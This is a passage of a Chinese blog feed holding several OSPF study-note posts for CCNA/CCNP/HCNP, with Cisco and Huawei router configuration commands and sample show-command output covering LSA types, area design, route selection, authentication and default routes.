1.1.1.1              指定Router-id，不指定则为环回地址，没有环回则为物理接                          口地址</p><p>R1(config-router)#network 12.1.1.1 0.0.0.0 area 0  可在接口内配置，IP ospd 100 area 0</p><p>​                    1、路由 2、激活 3、区域</p><p>OSPF三种表</p><p>邻居表</p><p>R2#show ip ospf neighbor</p><p>Neighbor ID     Pri   State           Dead Time   Address         Interface</p><p>1.1.1.1           1   FULL/DR         00:00:39    12.1.1.1        FastEthernet1/0</p><p>拓扑表</p><p>R2#show ip ospf database</p><p>​            OSPF Router with ID (2.2.2.2) (Process ID 100)</p><p>​                Router Link States (Area 0)</p><p>Link ID         ADV Router      Age         Seq#       Checksum Link count</p><p>1.1.1.1         1.1.1.1         90          0x80000005 0x00BF34 2</p><p>2.2.2.2         2.2.2.2         458         0x80000003 0x00BA04 3</p><p>​                Net Link States (Area 0)</p><p>Link ID         ADV Router      Age         Seq#       Checksum</p><p>12.1.1.1        1.1.1.1         470         0x80000001 0x004AD0</p><p> 路由表</p><p>R2#show ip ospf route</p><p>​            OSPF Router with ID (2.2.2.2) (Process ID 100)</p><p>​    Area BACKBONE(0)</p><p>​    Intra-area Route List</p><p>*   12.1.1.0/24, Intra, cost 1, area 0, Connected</p><p>​      via 12.1.1.2, FastEthernet1/0</p><p>*   23.1.1.0/24, Intra, cost 1, area 0, Connected</p><p>​      via 23.1.1.2, FastEthernet1/1</p><p>*&gt;  1.1.1.1/32, Intra, cost 2, area 0</p><p>​      via 12.1.1.1, FastEthernet1/0</p><p>*   2.2.2.2/32, Intra, cost 1, area 0, Connected</p><p>​      via 2.2.2.2, Loopback0</p><p>R2#show ip route ospf</p><p>​     1.0.0.0/32 is subnetted, 1 subnets</p><p>O       1.1.1.1 [110/2] via 12.1.1.1, 00:01:50, FastEthernet1/0</p><p>区域划分的规则：</p><p>星型结构 其他区域要和骨干域相连 </p><p>需要存在ABR 区域边界路由器</p><p>​                  通告者             内容</p><p>1类LSA  router  路由器本身         链路状态</p><p>2类LSA  network   DR             描述MA网络</p><p>3类LSA  sumary   ABR             路由条目</p><p>成为邻接关系的条件</p><p>1、如果在串行链路上 直接形成邻接关系</p><p>2、如果是以太网环境 只和DR/BDR形成邻接关系</p><p>选举规则</p><p>先比较优先级  越大越优先</p><p>比较Router-ID 越大越优先</p><p>非抢占性</p><p>修改优先级</p><p>R1(config)#int f0/0</p><p>R1(config-if)#ip ospf priority 2</p><p>干涉选择方法：</p><p>修改DR优先级最大，BDR次大；该选举非抢占，故必须手动重启所有设备进程</p><p>R2#clear ip ospf process </p><p>Reset ALL OSPF processes? [no]: y</p><p>修改DR优先级最大，BDR次大；将其他路由器修改为0</p><p>扩展配置：</p><p>认证</p><p>明文认证：</p><p>R2(config)#int s1/0</p><p>R2(config-if)#ip ospf authentication</p><p>R2(config-if)#ip ospf authentication-key 1 cisco</p><p>密文认证：</p><p>R2(config)#int f0/0</p><p>R2(config-if)#ip ospf authentication message-digest </p><p>R2(config-if)#ip ospf message-digest-key 1 md5 cisco</p><p>区域明文认证：</p><p>R3(config)#router ospf 100</p><p>R3(config-router)#area 0 authentication </p><p>区域密文认证：</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#area 1 authentication message-digest </p><p>被动接口</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#passive-interface loopback 0</p><p>加快收敛速度</p><p>R1(config)#int s1/1</p><p>R1(config-if)#ip ospf hello-interval 5     修改hello时间为5s dead time自动四倍关系</p><p>R1(config-if)#ip ospf dead-interval 20</p><p>链路两端必须一致</p><p>缺省路由</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#default-information originate </p><p>需要有缺省路由指向ISP</p><p>R1(config)#ip route 0.0.0.0 0.0.0.0 loopback 10</p><p>强制下放缺省</p><p>R1(config)#router ospf 100</p><p>R1(config-router)#default-information originate always</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;一、开放式最短路径优先协议&quot;&gt;&lt;a href=&quot;#一、开放式最短路径优先协议&quot; class=&quot;headerlink&quot; title=&quot;一、开放式最短路径优先协议&quot;&gt;&lt;/a&gt;一、开放式最短路径优先协议&lt;/h5&gt;&lt;p&gt; OSPF(Open Shortest Path First)是一个内部网关协议(Interior Gateway Protocol,简称IGP)。与RIP相对，OSPF是链路状态路由协议，而RIP是距离向量路由协议。链路是路由器接口的另一种说法，因此OSPF也称为接口状态路由协议。OSPF通过路由器之间通告网络接口的状态来建立链路状态数据库，生成最短路径树，每个OSPF路由器使用这些最短路径构造路由表。&lt;/p&gt;
    
    </summary>
    
      <category term="CCNA" scheme="http://soliym.top/categories/CCNA/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(二)</title>
    <link href="http://soliym.top/2021/06/19/OSPF(%E4%BA%8C)/"/>
    <id>http://soliym.top/2021/06/19/OSPF(二)/</id>
    <published>2021-06-19T14:37:20.970Z</published>
    <updated>2019-09-19T09:51:19.591Z</updated>
    
    <content type="html"><![CDATA[<h5 id="7、OSPF-从邻居建立成为邻接关系的条件"><a href="#7、OSPF-从邻居建立成为邻接关系的条件" class="headerlink" title="7、OSPF 从邻居建立成为邻接关系的条件"></a>7、OSPF 从邻居建立成为邻接关系的条件</h5><h6 id="1、网络类型"><a href="#1、网络类型" class="headerlink" title="1、网络类型"></a>1、网络类型</h6><p>基于接口网络类型来区别：</p><p>接口网络：判断网络类型，是基于设备接口的二层封装技术来进行的</p><a id="more"></a><p>点到点：在一个网段内只能存在两个节点，即便强制连接第三节点，最终也无法正常的通讯</p><p>​       串行链路上，二层封装为ppp或hdlc –没有物理寻址</p><p>MA：多路访问 –在一个网段内的节点数量不限制；</p><p>BMA： 广播型多路访问技术；在一个MA网络中同时存在广播机制；</p><p>​        二层封装技术为以太网；</p><p>NBMA：非广播型多路技术；在一个MA网络中没有广播机制；</p><p>​        二层封装技术为帧中继—串行链路   MGRE–点到点</p><p>在点到点网络中，OSPF协议正常均从邻居关系晋升为邻接关系；</p><p>在MA网络中，若所有邻居皆建立为邻接关系，将导致大量的重复更新；距离矢量路由协议在MA环境中使用了接口水平分割机制；由于OSPF协议是基于数据库同步对比的方式来进行收敛，故不支持接口的水平分割；</p><p>ospf最终将在MA网段进行DR/BDR的选举；非DR/BDR间将维持邻居关系，不建立邻接关系来避免重复更新；</p><h6 id="2、选举规则"><a href="#2、选举规则" class="headerlink" title="2、选举规则"></a>2、选举规则</h6><p>比较接口优先级  0-255 大优   </p><p> 默认点到点链路接口不行进行DR/BDR选举，故cisco 优先级为0-不参选  </p><p>MA网络中所有参选接口默认优选级为1，在优先级一致的情况必须参选设备的route-id数值大优；</p><p>干涉选举：修改参选接口的优先级</p><p>[r1-GigabitEthernet0/0/0]ospf dr-priority 2</p><p>因为选举非抢占，故修改优先级后，必须重启ospf协议进程</p><p><r1>reset ospf 1 process </r1></p><p>Warning: The OSPF process will be reset. Continue? [Y/N]:y</p><p>建议：网络存在DR/BDR后，其他设备修改为0，不参选；不需要重启设备的进程；</p><h6 id="8、OSPFlsa类型"><a href="#8、OSPFlsa类型" class="headerlink" title="8、OSPFlsa类型"></a>8、OSPFlsa类型</h6><p>1、OSPF的数据库表—LSDB 链路状态数据库</p><p>数据库表中装载OSPF的不同类型的LSA；</p><p>[r1]display  ospf lsdb  router   1.1.1.1     具体某条LSA</p><p>类别名   link-id</p><p>每条LSA均存在以下信息</p><p>  Type      : Router  类别名</p><p>  Ls id     : 1.1.1.1    link-id  在目录中番号</p><p>  Adv rtr   : 1.1.1.1    通告者的RID</p><p>  Ls age    : 532     老化时间 正常1800周期刷新，触发更新导致刷新；最大老化3609</p><p>  Len       : 60     长度</p><p>  Options   :  E      选项</p><p>  seq#      : 80000003   序列号</p><p>  chksum    : 0xb2ee     校验和码</p><p>OSPF的LSA是1800会更新一次序列号会加一</p><p>LSA的新旧比较</p><p>1、会先比较序列号，序列号越大越优，</p><p>2、如果序列号相同，会比较校验值（checksum)越大越优</p><p>3、如果校验值也相同，会比较LSA Age时间，是否等于MAX-age时间（3600）</p><p>4、如果age时间不等于max-age时间，会比较他们的差值，如果差值大15分钟（900秒），小的优</p><p>5、如果age时间不等于max-age时间，会比较他们的差值，如果差值小于15分钟，说明是同一条LSA，忽略其中一条</p><p>2、什么情况下LSA会更新：</p><p>1、1800到期会更新</p><p>2、触发更新（接口地址变化（增加，或删除），修改接口开销值，删除接口，或者删除通告）</p><p>[r4-ospf-1]import-route rip 1   将RIP进程1重发布到OSPF的进程1</p><p>[r5]display ospf lsdb ase originate-router  查看5类LSA</p><p>ASBR—自治系统边界路由器—协议边界路由器</p><p>3、LSA类型</p><p>LSA类别                 传播范围                         通告者                                    携带信息</p><p>LSA-1 router         本地设备所在区域     该区域每台设备的RID   每台设备本地所在区域的直连    拓扑</p><p>LSA-2 Network     本地设备所在区域                DR                     单个MA网段的拓扑</p><p>LSA-3 summary     整个OSPF域                       ABR                    域间路由</p><p>LSA-4 asbr             除ASBR所在的区域             ABR                   ASBR位置</p><p>​                              外的整个ospf域；               asbr                   所在区域基于1类交代位置</p><p>LSA-5 external      整个OSPF域                       ASBR                  域外路由</p><p>LSA-7 NSSA          本地的NSSA区域                ASBR                  域外路由</p><p>​                </p><p>LSA类别                    link-id                         通告者</p><p>LSA-1 router         通告者的RID                本区域内每台设备必须发送</p><p>LSA-2 Network      DR的接口ip地址          每个MA网段中的DR</p><p>LSA-3 summary     域间路由目标网络号     ABR，在经过下一台ABR时，修改为新的ABR的RID</p><p>LSA-4 asbr             ASBR的RID                 和ASBR同一区域的ABR，在经过下一台ABR时，修改为新的ABR的RID</p><p>LSA-5 external       域外路由目标网络号            ASBR</p><p>LSA-7 NSSA           域外路由目标网络号            ASBR；  离开本地NSSA区域时转换为5类</p><p>OSPF协议正常学习到的路由条目优先级为10；重发布进入的路由为150；</p><h6 id="9、LSA优化"><a href="#9、LSA优化" class="headerlink" title="9、LSA优化"></a>9、LSA优化</h6><p>优化OSPF协议，减少LSA的更新量；正常1类LSA是一台设备一条，2类lsa是一个网段的DR一条；3类和5类是一条路由一条LSA；4类是一台ASBR产生一条；</p><p>1、汇总—减少骨干区域的更新量</p><p>1）域间路由汇总—将非骨干区域汇总到骨干区域</p><p>在ABR上进行配置</p><p>[r1]ospf 1</p><p>[r1-ospf-1]area 2   只能汇总本地通过该区域1、2类LSA产生的路由</p><p>[r1-ospf-1-area-0.0.0.2]abr-summary 5.5.4.0 255.255.252.0 </p><p>注：汇总配置完成后，需要手工添加空接口防环路由</p><p>2）域外路由汇总；因为域外路由由ASBR重发布导入；故在导入的ASBR上进行配置</p><p>[r4]ospf 1</p><p>[r4-ospf-1]asbr-summary 99.1.0.0 255.255.252.0</p><p>2、特殊区域-减少非骨干区域的更新量—不能是骨干区域，不能存在的虚链路；</p><p>①不能存在ASBR</p><p>1、末梢区域 stub   拒绝4/5类的LSA；生成一条3类的缺省路由指向骨干区域</p><p>[r5]ospf 1   </p><p>[r5-ospf-1]area 2</p><p>[r5-ospf-1-area-0.0.0.2]stub</p><p>切记:该区域所有设备均需要定义为末梢区域；</p><p>2、完全末梢区域 在末梢区域的基础上，进一步拒绝3类lsa，仅保留一条3类的缺省；</p><p>先将该区域配置为末梢，区域然后仅在abr上定义完全即可；</p><p>[r1-ospf-1-area-0.0.0.2]stub no-summary</p><p>②存在ASBR</p><p>1、NSSA 非完全末梢区域—该区域拒绝其他区域的ASBR产生的4/5LSA；本地区域内ASBR产生的5类LSA，以7类在本区域传播，从本区域进入骨干区域时由ABR（新的ASBR）转换为5类，同时自动产生一条7的缺省指向骨干区域；</p><p>[r4]ospf</p><p>[r4-ospf-1]are 1</p><p>[r4-ospf-1-area-0.0.0.1]nssa  </p><p>本区域内所有设备均需配置</p><p>2、完全NSSA –在NSSA的基础上，进一步拒绝3的LSA；生成一条3类缺省指向骨干区域；</p><p>先将该区域配置为NSSA区域，然后仅在ABR上定义完全即可</p><p>[r3-ospf-1-area-0.0.0.1]nssa  no-summary</p><p>切记:考虑到ISP连接网络后，产生的缺省路由与OSPF特殊区域产生的缺省可能导致环路；</p><p>​     ISP连接到的哪个区域，那么该区域不能设定为任何的特殊区域；</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;7、OSPF-从邻居建立成为邻接关系的条件&quot;&gt;&lt;a href=&quot;#7、OSPF-从邻居建立成为邻接关系的条件&quot; class=&quot;headerlink&quot; title=&quot;7、OSPF 从邻居建立成为邻接关系的条件&quot;&gt;&lt;/a&gt;7、OSPF 从邻居建立成为邻接关系的条件&lt;/h5&gt;&lt;h6 id=&quot;1、网络类型&quot;&gt;&lt;a href=&quot;#1、网络类型&quot; class=&quot;headerlink&quot; title=&quot;1、网络类型&quot;&gt;&lt;/a&gt;1、网络类型&lt;/h6&gt;&lt;p&gt;基于接口网络类型来区别：&lt;/p&gt;
&lt;p&gt;接口网络：判断网络类型，是基于设备接口的二层封装技术来进行的&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(三)</title>
    <link href="http://soliym.top/2021/06/19/OSPF(%E4%B8%89)/"/>
    <id>http://soliym.top/2021/06/19/OSPF(三)/</id>
    <published>2021-06-19T14:37:20.958Z</published>
    <updated>2019-09-23T09:57:49.065Z</updated>
    
    <content type="html"><![CDATA[<h5 id="10、过滤OSPF路由"><a href="#10、过滤OSPF路由" class="headerlink" title="10、过滤OSPF路由"></a>10、过滤OSPF路由</h5><p>利用OSPF的汇总，在汇总条目的同时要求ospf协议传递这些汇总路由来实现路由过滤—cisco、华为均可</p><a id="more"></a><p> ospf 1 router-id 4.4.4.4 </p><p> area 0.0.0.1 </p><p> abr-summary 192.168.1.144 255.255.255.248 not-advertise  该条路由将不能再传递—3类</p><p>[r6]ospf  1 </p><p>[r6-ospf-1]asbr-summary 192.168.1.132 255.255.255.252 not-advertise  拒绝7类的传递</p><p>注：此处所谓的汇总网络号，实际可以是具体的明细路由；</p><h5 id="11、OSPF不规则区域"><a href="#11、OSPF不规则区域" class="headerlink" title="11、OSPF不规则区域"></a>11、OSPF不规则区域</h5><p>（一）规则区域：星型结构—骨干区域位于中心，非骨干区域连接骨干区域</p><p>​                   —必须存在合法的ABR</p><p>该规则的意义在于减少LSA的更新量—星型结构稳定性较高，性价比好；</p><p>OSPF存在的条件：</p><p>1、直连的邻居间，区域ID必须相同，route-id不同，否则无法建立邻居关系—ABR-连接不同的区域。</p><p>2、一台ABR没有连接到骨干区域，则为不合法ABR，不能进行路由信息的共享。</p><p>3、合法的ABR上的区域间。可直接进行路由信息共享，无须经过骨干区域。</p><p>（二）不规则区域</p><p>1、没有连接到骨干的非骨干区域</p><p>2、不连续的骨干区域</p><p>（三）解决方法：</p><p>​       1）tunnel 隧道–GRE，一种简单的VPN</p><p>在两台的ABR上建立tunnel，然后将其宣告到OSPF协议中</p><p>配置：</p><p>interface Tunnel0/0/0</p><p> ip address 10.1.1.1 255.255.255.0 </p><p> tunnel-protocol gre</p><p> source 34.1.1.1</p><p>destination 45.1.1.2</p><p>缺点：</p><p>1、周期和触发的信息将对中间的穿越区域造成资源的占用；</p><p>2、选路不佳</p><p>​      2）OSPF-vlink 虚电路—网络中合法的ABR（工作的区域0的ABR），和非法ABR间建立一条虚链路（在OSPF协议中构建，没有新生网段）   由合法ABR授权非法ABR进行区域间路由共享</p><p>配置：</p><p> [r3]ospf 1 </p><p> [r3-ospf-1]area 1 </p><p> [r3-ospf-1-area-0.0.0.1]vlink-peer 5.5.5.5    此处5.5.5.5为对端ABR的router-id</p><p>优点：</p><p>没有新生链路，故选路正常    </p><p>缺点：</p><p>cisco设备中OSPF虚链路为避免对中间穿越区域周期保活和更新产生资源占用，取消了周期的hello包和周期更新；—- 不可靠，不稳定</p><p>华为设备中依然保留周期的hello包和更新—-占用中间区域资源</p><p>​          3）OSPF多进程双向重发布</p><p>OSPF多进程，进程号仅具有本地意义，邻居间建立邻居关系时可以使用不同的进程号；</p><p>若在一台设备上同时启动多个进程，那么不同进程存在自己的邻居关系，生成不同的数据库（不共享）；</p><p>最终将所有数据库计算所得路由加载于同一张路由表中；</p><p>在解决不规则区域时，可以让非法ABR将不同的OSPF区域工作在不同的OSPF进程中，之后使用双向重发布技术来实现路由共享；</p><p>配置：</p><p>[r2]ospf  1 </p><p>[r2-ospf-1]import-route  ospf  2 </p><p>[r2]ospf  2 </p><p>[r2-ospf-2]import-route  ospf  1</p><p>优点：1、选路正常    2、无周期信息   3、但依然可靠（触发更新、邻居关系周期保障）</p><h5 id="12、OSPF扩展知识"><a href="#12、OSPF扩展知识" class="headerlink" title="12、OSPF扩展知识"></a>12、OSPF扩展知识</h5><p>（一）附录E — link-id相同的问题</p><p>若一台ABR将两条3类LSA导入其他区域；同时这两条LSA的link-id会相同；</p><p>假设：短掩码网段先进入，link-id正常显示；长掩码进入时link-id加反掩码</p><p>20.1.0.0/16–link-id  20.1.0.0   </p><p>20.1.0.0/24–link-id  20.1.0.255   </p><p>若长掩码先进入，再短掩码进入时，长掩码的信息被刷新为反掩码；</p><p>link-id相同时，短掩码正常显示，长掩码加反掩码</p><p>（二）OSPF选路规则</p><p>1、AD（管理距离）无关的第一种情况：</p><p>r2(config)#router ospf 1 </p><p>r2(config-router)#distance 109 1.1.1.1 0.0.0.0</p><p>本地从RID为1.1.1.1的设备处学习到路由条目，管理距离修改109；</p><p>一台路由器从两个OSPF邻居处学习到了两条相同的路由时，仅比较度量值，不关注管理距离；因为仅针对一台邻居进行管理距离修改的结果是要么两台都被改，要么修改失败；-关注IOS版本—有时修改RID大路由器管理距离生效，有时需要修改RID小的设备；</p><p>2、AD（管理距离）无关的第二种情况 O  IA 3类</p><p>O IA 与 O IA路由相遇，到达相同目标的两条3类路由，这两条路由均通过非骨干传递，仅关注cost值，不关注管理距离；</p><p>若一条通过骨干区域传递，另一条同过非骨干区域传递–非骨干传递的路由无效</p><p>OSPF的水平分割：区域标号为A的3类LSA，不能回到区域A；</p><p>3、OE 与OE   E为5类    N 为7类   默认所有重发布进入路由条目均为类型2，类型2在路由表中cost值不会显示沿途的累加，仅显示起始度量；</p><p>①两条均为OE2或者均为N2，起始度量相同； 关注沿途的累加度量 （OE2路由在表中度量默认不显示内部度量，仅显示起始度量）</p><p>②两条均为OE2或者均为N2，起始度量不同；优先起始度量小的路径；</p><p>注：以上设计是便于管理员快速干涉选路；</p><p>4、OE1路由仅比较总度量（起始度量+沿途累加），仅修改起始度量不一定能干涉选路，必须在修改或使得总度量产生区别才能干涉选路；</p><p>拓扑优于路由   1/2LSA计算所得路由优于3/4/5/7类计算所得</p><p>内部优于外部   3类优于4/5/7类</p><p>类型1优于类型2  E1优于E2，N1优于N2，E1优于N2，N1优于E2；</p><p>E1与N1相遇，或E2与N2相遇，先比总度量（起始+沿途）小优；度量一致5类优于7类</p><p>5、FA-转发地址</p><p>正常OSPF区域收到的5类LSA不存在FA值；</p><p>产生FA的条件：</p><p>1、5类LSA —- 假设R9为ASBR，S0/0口工作的OSPF中，E0/0口工作在非ospf协议或不同ospf进程中；且S0/1也宣告在和S0/0相同的OSPF进程中，同时该接口的工作方式为广播型；</p><p>将在5类LSA中出现FA地址，地址为R9连接R10网段中R10的接口ip；R9与R10间运行的是EIGRP协议</p><p>意义在于让R9前端的OSPF设备(比如R8)，清楚的知道域外的下一跳拓扑结构，更好的避免环路；</p><p>2、7类LSA—必然出现FA地址</p><p>假设R9为ASBR，S0/0口工作的OSPF中，S0/1口工作在非ospf协议或不同进程中；</p><p>S0/1未运行OSPF–FA地址为R9上最后宣告的环回地址（个别IOS也可能是最大环回接口ip地址），若R9没有环回接口；FA地址为R9上最后宣告的物理接口地址（个别IOS也可能是最大的物理接口ip地址）</p><p>R9的S0/1也工作OSPF协议中，S0/1接口工作方式为广播，那么FA地址为R10接口ip；</p><p>S0/1的工作方式为点到点，那么FA地址为R9的s0/1口ip</p><p>切记：在FA地址出现后，4类LSA无效；人为过滤掉4类LSA，依然可达域外；</p><p>​      当4类LSA存在，却人为过滤了到达FA地址的路由，那么将无法访问域外；</p><p>​      一旦出现FA地址，所有的选路计算均基于FA地址进行；</p><p> 1、针对存在FA的5/7类路由，4类LSA无意义，仅递归到FA地址；若FA地址被策略过滤导致不可达；</p><p> 2、路由表中的度量是到FA地址的度量，不是到ASBR的度量；</p><p>6、NP位+E位   P位被加密，故抓包时看不见P位；</p><p>正常NSSA区域内的1类LSA中，N=1    E=0  标识该区域转发7类LSA，不转发5类</p><p>非NSSA区域E=1 N=0 标识可以转发5类，不能转发7类</p><p>P位为1，标识该区域将执行7类转5类；  P为0，不能7转5；</p><p>区域0连接到两个非骨干区域，这两个非骨干假设为区域1和区域2；区域1/2同时连接外部协议，且同时进行了重发布配置；区域1为NSSA区域，区域2为非NSSA区域；那么此时的区域1，P位=0不能进行7转5；故骨干区域只能收到从区域2来的外部路由；</p><p>若区域1和区域2均为NSSA区域，那么ABR的RID大区域进行7转5，另一个区域不转，</p><p>故骨干区域只能收到从一个区域传递的外部路由；</p><p>7、SFP算法 –OSPF防环机制</p><p>在同一个区域每台路由具有一致的LSDB</p><p>每台路由器以自己为根计算到达每个目标的最短路径（最小cost值）</p><p>必须区域划分–</p><p>优势-1）域间汇总减少路由条目数量</p><p>汇总路由是在所有明细路由均消失后才删除，网络更稳定</p><p>区域划分后不同类别的LSA传播范围不同，控制更新量</p><p>过程–基于本地LSDB(1/2类LSA)生成–生成有向图–基于有向图来进行最短路径树生成</p><p>最短路径树，关注本地LINK-ID的LSA开始–》基于该LSA内提及到点到点或传输网络信息再查看link-id递归到下一条信息；基于所有点到点和传输网络信息生成最短路径树主干；</p><p>然后用树中每台设备的末梢网络信息补充路由表，完成收敛</p><h5 id="13、OSPF的扩展配置"><a href="#13、OSPF的扩展配置" class="headerlink" title="13、OSPF的扩展配置"></a>13、OSPF的扩展配置</h5><p>1、认证—接口认证</p><p>[r3]interface GigabitEthernet 0/0/1   在直连邻居的接口上配置即可</p><p>[r3-GigabitEthernet0/0/1]ospf authentication-mode md5 1 cisco123   密文认证，key编号1，密码为cisco123，密码直接以MD5值传递；</p><p>2、被动接口 – 只接受不发送路由协议的信息，其他信息正常通过；华为成为沉默接口</p><p>[r3]ospf 1 </p><p>[r3-ospf-1]silent-interface GigabitEthernet 0/0/0</p><p>3、修改计时器—OSPF的hello time 为10或30s；dead time为hello 的4倍；</p><p>3类缺省 –》 配置特殊区域后自动生成  –  末梢、完全末梢、完全NSSA</p><p>5类缺省—》本地路由表中通过其他协议或OSPF的其他进程生成了缺省路由条目—前提</p><p>之后使用重发布机制将改条目重发布到ospf的协议中来；</p><p>[r4]ospf  1 </p><p>[r4-ospf-1]default-route-advertise</p><p>默认导入路由起始度量为1,类型2；</p><p>[r4-ospf-1]default-route-advertise type 1 cost 10  修改类型和起始度量</p><p>改小计时器可以加快收敛速度，但将增加对网络资源占用；故修改时不宜修改过小，维持原有的倍数关系；</p><p>[r3]interface GigabitEthernet 0/0/1</p><p>[r3-GigabitEthernet0/0/1]ospf timer hello 5  修改本端的hello time，本端的dead time自动4倍关系匹配；直连邻居间hello 和dead time必须完全一致，否则无法建立邻居关系；</p><p>缺省路由 –  3类的缺省        5类的缺省      7类缺省</p><p>若本地路由表中没有缺省条目，也可以让设备强制向内网发送一条5类缺省</p><p>[r4-ospf-1]default-route-advertise always  默认为类型2，cost值为1；</p><p>[r4-ospf-1]default-route-advertise always type 1 cost 10  修改类型和起源cost；</p><p>7类缺省：普通的NSSA区域将自动产生7类的LSA；也可在NSSA区域内手动生成出7类缺省</p><p>[r4]ospf  1 </p><p>[r4-ospf-1]area 1 </p><p>[r4-ospf-1-area-0.0.0.1]nssa default-route-advertise  默认为类型2 ，起始cost为1；</p><p>优选顺序：内部优于外部，类型1优于类型2；</p>]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;10、过滤OSPF路由&quot;&gt;&lt;a href=&quot;#10、过滤OSPF路由&quot; class=&quot;headerlink&quot; title=&quot;10、过滤OSPF路由&quot;&gt;&lt;/a&gt;10、过滤OSPF路由&lt;/h5&gt;&lt;p&gt;利用OSPF的汇总，在汇总条目的同时要求ospf协议传递这些汇总路由来实现路由过滤—cisco、华为均可&lt;/p&gt;
    
    </summary>
    
      <category term="CCNP/HCNP" scheme="http://soliym.top/categories/CCNP-HCNP/"/>
    
    
      <category term="OSPF" scheme="http://soliym.top/tags/OSPF/"/>
    
  </entry>
  
  <entry>
    <title>OSPF(一)</title>
    <link href="http://soliym.top/2021/06/19/OSPF(%E4%B8%80)/"/>
    <id>http://soliym.top/2021/06/19/OSPF(一)/</id>
    <published>2021-06-19T14:37:20.945Z</published>
    <updated>2019-09-19T09:50:58.070Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一、动态路由协议"><a href="#一、动态路由协议" class="headerlink" title="一、动态路由协议"></a>一、动态路由协议</h4><p>1、动态路由协议：直连路由间构建邻居关系，通过相互沟通学习路由信息，来获取未知的路由信息，然后根据不同的路由选择算法，计算到达未知网段的最佳路径，并将其加载到路由表中。</p><a id="more"></a><p>2、动态路由协议分类：</p><p>​                   1、基于AS将路由协议分为IGP和EGP</p><p>​                         AS-自治系统    </p><p>​                                   0-65535  标准为2个字节   扩展为4个字节</p><p>​                                                   1-64511          公有</p><p>​                                                    64512-65535 私有</p><p>​                         IGP—内部网关路由协议（as之内使用）</p><p>​                                   RIP/OSPF/EIGRP(Cisco)/isis</p><p>​                                 EGP—外部网关路由协议（as之间使用）</p><p>​                                    BGP/EGP</p><p>​                   2、内部网关路由协议—IGP分类</p><p>​                         ①更新时是否携带子网掩码：有类别—不携带</p><p>​                                                                     无类别—携带</p><p>​                         ②工作特点：距离适量—RIP/EIGRP</p><p>​                                                                基于路由条目收敛</p><p>​                                             链路状态—OSPF/ISIS</p><p>​                                                               基于LSA收敛</p><h4 id="二、开放式最短路径优先协议"><a href="#二、开放式最短路径优先协议" class="headerlink" title="二、开放式最短路径优先协议"></a>二、开放式最短路径优先协议</h4><h5 id="1、OSPF协议特点"><a href="#1、OSPF协议特点" class="headerlink" title="1、OSPF协议特点"></a>1、OSPF协议特点</h5><p>适用范围：IGP</p><p>类型：链路状态型动态路由协议</p><p>算法：SPF算法  </p><p>封装：基于IP封装，协议号为89—跨层封装</p><p>版本：OSPFV2—IPV4、OSPFV3—IPV6</p><p>更新方式：组播或单播—224.0.0.5/224.0.0.6</p><p>​                      触发更新/周期更新—周期更新时间是30min</p><p>区域划分：OSPF需要合理规划IP地址和区域划分</p><p>​                 —目的：减少lsa数量、减少lsa传播范围、减少对资源的消耗</p><p>​                 —原因：OSPF需要消耗大量的路由器资源</p><p>metric计算：OSPF使用cost计算metric</p><p>​                    cost=参考带宽/链路实际带宽</p><p>​                    每条路由信息的metric值=该条路径上每段链路的cost值的总和</p><p>router-id：在网络内唯一标识一台路由器</p><h5 id="2、区域划分"><a href="#2、区域划分" class="headerlink" title="2、区域划分"></a>2、区域划分</h5><p>​     1、区域内传拓扑：</p><p>​          —用于每台路由器计算到达所有未知路径的最短路径</p><p>​          —拓扑信息：路由器之间的连接关系</p><p>​    2、 区域间传路由：</p><p>​           —区域间传递计算完成的路由信息</p><p>​           —路由信息：包含的接口的路由信息</p><p>​     3、区域标识：使用十进制或类似于ip地址的32位二进制</p><p>​     4、区域划分：基于链路（接口）</p><p>​     5、区域类型：骨干区域</p><p>​                            —区域0，必须存在且唯一</p><p>​                                  非骨干区域</p><p>​                           —非0区域</p><p>​     6、 路由器的角色：        </p><p>​           —骨干路由器：一个路由器的所有接口都在area 0中</p><p>​            —非骨干路由器：一个路由器的所有接口都不在area 0 中</p><p>​            —ABR：区域边界路由器：能够产生3类LSA的路由器既有接口属于area 0 又有接口属        于非area 0</p><p>​            —ASBR：自治系统边界路由器，能够产生5类或7类LSA的路由器，连接ospf网络和非ospf网络，并且将非ospf引入到ospf网络中</p><p>​       7、区域划分规则</p><p>​          ①OSPF网络中必须存在并唯一的骨干区域（若OSPF仅仅存在一个区域可以为非0区域）</p><p>​          ②非骨干区域必须与骨干区域直接相连（非骨干不能非骨干直接相连）</p><p>​     8、不规则区域：1.不连续的0区域     2.非骨干没有挂靠在骨干区域之上</p><h5 id="3、OSPF数据报"><a href="#3、OSPF数据报" class="headerlink" title="3、OSPF数据报"></a>3、OSPF数据报</h5><p>   OSPF数据包跨层封装于三层报头</p><p><img src="file:///C:/Users/ASUS/AppData/Local/Packages/Microsoft.Office.OneNote_8wekyb3d8bbwe/TempState/msohtmlclip/clip_image001.png" alt="img"></p><p>五类数据报：</p><p>1、hello（224.0.0.5）：发现、建立、保活邻居关系、邻接关系</p><p>2、DBD-数据库描述包：本地链路状态数据库的目录</p><p>3、LSR-链路状态查询：根据DBD中的描述，对未知的lsa请求</p><p>4、LSU-链路状态更新：对请求的LSR的回复，携带lsa信息</p><p>5、LSACK-链路状态确认：确认包，保证lsa传递的可靠性</p><p>DBD：数据库描述数据包  使用隐式确认，分为两种：1.主从选举DBD-包含mtu，若不一致则停留在预启动   2.发送LSA头部摘要信息（LSA目录）</p><p>由于IP数据报不可靠，所以除hello外，其他数据包需要确认</p><p>DBD—序列号，显示或隐式确认</p><p>LSR—LSU</p><p>LSU—LSACK</p><h5 id="4、OSPF状态机"><a href="#4、OSPF状态机" class="headerlink" title="4、OSPF状态机"></a>4、OSPF状态机</h5><p>down：一旦收发hello，则进入下一状态</p><p>init—初始化：当接收到的hello中携带自己的router-id，则进入下一状态</p><p>2way—双发通信：邻居关系建立的标志</p><p>​             